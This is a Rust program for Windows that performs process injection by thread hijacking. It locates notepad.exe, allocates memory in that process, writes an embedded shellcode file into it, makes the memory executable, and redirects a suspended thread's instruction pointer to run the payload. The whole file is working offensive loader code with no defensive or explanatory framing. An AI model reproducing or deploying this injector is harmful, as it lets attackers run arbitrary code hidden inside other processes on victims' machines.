use core::slice;
use std::ptr::null_mut;

use windows_sys::{
    Wdk::System::SystemInformation::{NtQuerySystemInformation, SystemProcessInformation},
    Win32::{
        Foundation::{CloseHandle, STATUS_INFO_LENGTH_MISMATCH},
        System::{
            Diagnostics::Debug::{
                CONTEXT, CONTEXT_CONTROL_AMD64, GetThreadContext, SetThreadContext,
                WriteProcessMemory,
            },
            Memory::{
                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
                VirtualProtectEx,
            },
            Threading::{
                OpenProcess, OpenThread, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, ResumeThread,
                SuspendThread, THREAD_GET_CONTEXT, THREAD_QUERY_INFORMATION, THREAD_SET_CONTEXT,
                THREAD_SUSPEND_RESUME,
            },
            WindowsProgramming::{SYSTEM_PROCESS_INFORMATION, SYSTEM_THREAD_INFORMATION},
        },
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE.len();

fn find_pid(process_name: &str) -> u32 {
    let mut pid: u32 = 0;

    unsafe {
        let mut return_length: u32 = 0;

        let status =
            NtQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_length);

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("[-] Failed to query system information");
            return pid;
        }

        let buffer_size = return_length as usize;
        let mut buffer: Vec<u8> = vec![0; buffer_size];

        let status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_mut_ptr() as *mut std::ffi::c_void,
            buffer_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("[-] Failed to query system information");
            return pid;
        }

        let mut process_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if !(*process_info).ImageName.Buffer.is_null()
                && process_name.eq_ignore_ascii_case(
                    String::from_utf16_lossy(slice::from_raw_parts(
                        (*process_info).ImageName.Buffer,
                        (*process_info).ImageName.Length as usize / 2,
                    ))
                    .as_str(),
                )
            {
                pid = (*process_info).UniqueProcessId as u32;
                break;
            }

            if (*process_info).NextEntryOffset == 0 {
                break;
            }

            process_info = (process_info as *const u8).add((*process_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    pid
}

fn find_tid(pid: u32) -> u32 {
    let mut tid: u32 = 0;
    unsafe {
        let mut return_length: u32 = 0;

        let status =
            NtQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_length);
        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("[-] Failed to query system information");
            return 0;
        }

        let buffer_size = return_length as usize;
        let mut buffer: Vec<u8> = vec![0; buffer_size];

        let status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_mut_ptr() as _,
            buffer_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("[-] Failed to query system information");
            return 0;
        }

        let mut process_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if (*process_info).UniqueProcessId as u32 == pid {
                println!("[+] Found {} threads", (*process_info).NumberOfThreads);

                let offset = (process_info as usize) - (buffer.as_ptr() as usize);

                let thread_offset = offset + size_of::<SYSTEM_PROCESS_INFORMATION>();
                let thread_info_ptr =
                    buffer.as_ptr().add(thread_offset) as *const SYSTEM_THREAD_INFORMATION;

                for i in 0..(*process_info).NumberOfThreads as usize {
                    let thread_info = thread_info_ptr.add(i);
                    tid = (*thread_info).ClientId.UniqueThread as u32;
                    break;
                }
            }

            if (*process_info).NextEntryOffset == 0 {
                break;
            }

            process_info = (process_info as *const u8).add((*process_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    tid
}

// fn hijack_thread(pid: u32, shellcode_ptr: *mut c_void) -> bool {
//     unsafe {
//         let tid = find_tid(pid);
//         if tid == 0 {
//             println!("[-] Failed to find thread ID for process ID: {}", pid);
//             return false;
//         }
//         println!("[+] Found thread ID: {}", tid);

//         let thread_handle = OpenThread(
//             THREAD_QUERY_INFORMATION
//                 | THREAD_GET_CONTEXT
//                 | THREAD_SET_CONTEXT
//                 | THREAD_SUSPEND_RESUME,
//             0,
//             tid,
//         );
//         if thread_handle.is_null() {
//             println!("[-] Failed to open thread with ID: {}", tid);
//             return false;
//         }

//         if SuspendThread(thread_handle) == u32::MAX {
//             println!("[-] Failed to suspend thread with ID: {}", tid);
//             return false;
//         }

//         let mut context: CONTEXT = std::mem::zeroed();
//         context.ContextFlags = CONTEXT_FULL_AMD64;

//         if GetThreadContext(thread_handle, &mut context) == 0 {
//             println!("[-] Failed to get thread context for thread ID: {}", tid);
//             ResumeThread(thread_handle);
//             return false;
//         }

//         let rip = context.Rip;

//         context.Rip = shellcode_ptr as u64;

//         if SetThreadContext(thread_handle, &context) == 0 {
//             println!("[-] Failed to set thread context for thread ID: {}", tid);
//             ResumeThread(thread_handle);
//             return false;
//         }

//         ResumeThread(thread_handle);

//         CloseHandle(thread_handle);
//     }
//     true
// }

fn main() {
    let process_name = "notepad.exe".to_string();

    let pid = find_pid(&process_name);

    if pid == 0 {
        println!("[-] Failed to find process ID for {}", process_name);
        return;
    }

    println!("[+] Found process ID: {}", pid);

    unsafe {
        let process_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION
                | PROCESS_CREATE_THREAD
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            0,
            pid,
        );

        if process_handle.is_null() {
            println!("[-] Failed to open process with ID: {}", pid);
            return;
        }

        let exec_mem = VirtualAllocEx(
            process_handle,
            null_mut(),
            SHELLCODE_SIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if exec_mem.is_null() {
            println!("[-] Failed to allocate memory in target process");
            CloseHandle(process_handle);
            return;
        }

        println!(
            "[+] Allocated {} bytes at {:p} in target process",
            SHELLCODE_SIZE, exec_mem
        );

        let mut bytes_written: usize = 0;
        if WriteProcessMemory(
            process_handle,
            exec_mem,
            SHELLCODE.as_ptr() as _,
            SHELLCODE_SIZE,
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write shellcode to target process");
            CloseHandle(process_handle);
            return;
        }

        println!(
            "[+] Wrote {} bytes of shellcode to target process",
            bytes_written
        );

        let mut old_protect: u32 = 0;
        if VirtualProtectEx(
            process_handle,
            exec_mem,
            SHELLCODE_SIZE,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == 0
        {
            println!("[-] Failed to change memory protection in target process");
            CloseHandle(process_handle);
            return;
        }

        // if !hijack_thread(pid, exec_mem) {
        //     println!("[-] Failed to hijack thread in target process");
        //     CloseHandle(process_handle);
        //     return;
        // }

        let tid = find_tid(pid);
        if tid == 0 {
            println!("[-] Failed to find thread ID for process ID: {}", pid);
            return;
        }
        println!("[+] Found thread ID: {}", tid);

        let thread_handle = OpenThread(
            THREAD_QUERY_INFORMATION
                | THREAD_GET_CONTEXT
                | THREAD_SET_CONTEXT
                | THREAD_SUSPEND_RESUME,
            0,
            tid,
        );
        if thread_handle.is_null() {
            println!("[-] Failed to open thread with ID: {}", tid);
            return;
        }

        if SuspendThread(thread_handle) == u32::MAX {
            println!("[-] Failed to suspend thread with ID: {}", tid);
            return;
        }

        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_CONTROL_AMD64;

        if GetThreadContext(thread_handle, &mut context) == 0 {
            println!("[-] Failed to get thread context for thread ID: {}", tid);
            ResumeThread(thread_handle);
            return;
        }

        let _rip = context.Rip;

        context.Rip = exec_mem as u64;

        if SetThreadContext(thread_handle, &context) == 0 {
            println!("[-] Failed to set thread context for thread ID: {}", tid);
            ResumeThread(thread_handle);
            return;
        }

        ResumeThread(thread_handle);

        CloseHandle(thread_handle);

        CloseHandle(process_handle);
    }
}
